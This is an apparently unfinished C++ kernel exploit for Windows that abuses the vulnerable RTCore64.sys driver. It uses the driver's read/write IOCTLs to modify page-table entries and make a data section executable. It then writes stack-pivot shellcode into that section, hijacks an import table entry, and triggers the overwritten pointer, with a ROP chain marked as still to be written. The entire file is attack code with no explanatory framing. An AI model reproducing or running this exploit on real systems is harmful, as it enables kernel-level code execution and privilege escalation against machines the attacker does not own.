#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>

static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;
static const DWORD RTCORE64_TRIGGER = 0x80002050;	// trigger

#define ARRAY_SIZE1 1024

struct RTCORE64_MEMORY_READ
{
	BYTE Pad0[8];

	DWORD64 Address;

	BYTE Pad1[8];

	DWORD ReadSize;

	DWORD Value;

	BYTE Pad3[16];
};

DWORD ReadMemoryPrimitive(HANDLE device, DWORD size, DWORD64 address)
{
	RTCORE64_MEMORY_READ MemoryRead{};

	MemoryRead.Address = address;

	MemoryRead.ReadSize = size;

	DWORD BytesReturned;

	DeviceIoControl(device, RTCORE64_MEMORY_READ_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned, nullptr);

	return MemoryRead.Value;
}

DWORD ReadMemoryDWORD(HANDLE device, DWORD64 address)
{
	return ReadMemoryPrimitive(device, 4, address);
}

DWORD64 ReadMemoryDWORD64(HANDLE device, DWORD64 address)
{
	return (static_cast<DWORD64>(ReadMemoryDWORD(device, address + 4)) << 32) | ReadMemoryDWORD(device, address);
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value)
{
	RTCORE64_MEMORY_READ MemoryRead{};

	MemoryRead.Address = Address;

	MemoryRead.ReadSize = Size;

	MemoryRead.Value = Value;

	DWORD BytesReturned;

	DeviceIoControl(Device, RTCORE64_MEMORY_WRITE_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned, nullptr);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value)
{
	WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);

	WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


DWORD64 find_kernel_base()
{
	LPVOID drivers[1024];
	DWORD lpcbNeeded;
	DWORD64 kernel_image_base;
	int c_drivers = 0;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &lpcbNeeded))
	{
		kernel_image_base = (DWORD64)drivers[0];
		c_drivers = lpcbNeeded / sizeof(drivers[0]);
	}
	else
	{
		printf("[-] Failed to enumerate device drivers\n\n");
		return -1;
	}

	return kernel_image_base;

}

DWORD64 enum_drvs(void)
{
	LPVOID drivers[ARRAY_SIZE1];
	DWORD cbNeeded;
	int cDrivers, i;
	DWORD64 driver_base_address;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		TCHAR szDriver[ARRAY_SIZE1];
		cDrivers = cbNeeded / sizeof(drivers[0]);

		for (i = 0; i < cDrivers; i++)
		{

			driver_base_address = (DWORD64)drivers[i];

			if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
			{

				TCHAR target_drv[] = L"RTCore64.sys";

				if (_tcsicmp(szDriver, target_drv) == 0)
				{

					_tprintf(TEXT("%d: %s\n"), i + 1, szDriver);

					printf("[+] vuln driver found\n");

					printf("[+] vuln drv base address : 0x%llx\n", driver_base_address);

					break;

				}

			}
		}
	}
	else
	{
		_tprintf(TEXT("[-] EnumDeviceDrivers failed; array size needed is %d\n"), cbNeeded / sizeof(LPVOID));
		return 1;
	}

	return driver_base_address;
}

DWORD64 pte_base_ptr;

DWORD64 get_va_pte(DWORD64 va)
{

	DWORD64 test_pte = va >> 9;
	test_pte &= 0x7ffffffff8;
	test_pte += pte_base_ptr;

	return test_pte;

}




int main()
{

	// Get handle to the driver
	HANDLE device = CreateFile((LPCWSTR)L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, NULL);

	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[+] Failed to get a handle to the device.\n");

		return -1;
	}
	else
	{
		printf("[+] Got a handle to the device\n");
	}

	// find the address of the kernel
	DWORD64 kernel_image_base = NULL;

	kernel_image_base = find_kernel_base();

	if (kernel_image_base == NULL)
	{
		printf("[-] Failed to find the kernel address\n");
		return -1;
	}

	printf("[+] Kernel address: 0x%llx\n", kernel_image_base);

	// get the pte base
	DWORD64 mi_get_pte_addr = kernel_image_base + 0x221EF0;
	DWORD64 pte_base = mi_get_pte_addr + 0x13;

	pte_base_ptr = ReadMemoryDWORD64(device, pte_base);

	printf("[+] PTE base: 0x%llx\n", pte_base_ptr);


	// find driver's base
	DWORD64 vuln_drv_base = enum_drvs();

	// put shellcode to the end of the driver's data section
	DWORD64 data_cave = vuln_drv_base + 0x3000; // in the data section

	printf("[+] data section cave: 0x%llx\n", data_cave);

	// flip the executable bit

	DWORD64 data_cave_pte = get_va_pte(data_cave);

	printf("[+] data section cave PTE: 0x%llx\n", data_cave_pte);

	// make the data cave executable

	DWORD64 data_cave_pte_val = ReadMemoryDWORD64(device, data_cave_pte);
	data_cave_pte_val &= 0x0fffffffffffffff;

	printf("[+] Press any key to make the code cave writeable\n");
	getchar();

	WriteMemoryDWORD64(device, data_cave_pte, data_cave_pte_val);

	printf("[+] Press any key to write the stack pivot\n");
	getchar();

	// copy stack pivot shellcode there
	DWORD64 s_pivot[2] = {0};

	s_pivot[0] = 0x50d0014820e0c148;
	s_pivot[1] = 0x000000000000c35c;

	WriteMemoryDWORD64(device, data_cave, s_pivot[0]);
	WriteMemoryDWORD64(device, data_cave + 8, s_pivot[1]);

	printf("[+] Check the stack pivot gadget\n");
	getchar();

	// make the data cave read only and executable again
	data_cave_pte_val = ReadMemoryDWORD64(device, data_cave_pte);
	data_cave_pte_val &= 0xfffffffffffffff1;
	WriteMemoryDWORD64(device, data_cave_pte, data_cave_pte_val);

	// get the pte of IAT

	DWORD64 iat_pte_addr = get_va_pte(vuln_drv_base + 0x2008); // HalGetBusDataByOffset

	printf("[+] IAT PTE address: 0x%llx\n", iat_pte_addr);

	// make the IAT writeble

	DWORD64 pte_val = ReadMemoryDWORD64(device, iat_pte_addr);

	printf("[+] PTE val: 0x%llx\n", pte_val);

	pte_val |= 0x2;

	WriteMemoryDWORD64(device, iat_pte_addr, pte_val);

	// overwrite the address with 
	WriteMemoryDWORD64(device, vuln_drv_base + 0x2008, data_cave);

	printf("[+] Press any key to trigger the pointer\n");
	getchar();

	// trigger the pointer	
	char buf[24] = { 0 };

	memset(buf, 0x41, sizeof(buf));

	*(DWORD *)(buf + 0x0c)	=	0xfffff780;	 		// these values should contain the address of the ROP chain in  kuser_shared_data
	*(DWORD *)(buf)			=	0x00000800;
	*(DWORD *)(buf + 0x10)	=	4;

	DWORD BytesReturned;

	DeviceIoControl(device, RTCORE64_TRIGGER, &buf, 24 , &buf, 24, &BytesReturned, nullptr);

	

	// write a ROP chain into kuser_shared_data
	// 0xfffff780 00000800








	// DONE

	CloseHandle(device);

	return 0;

}

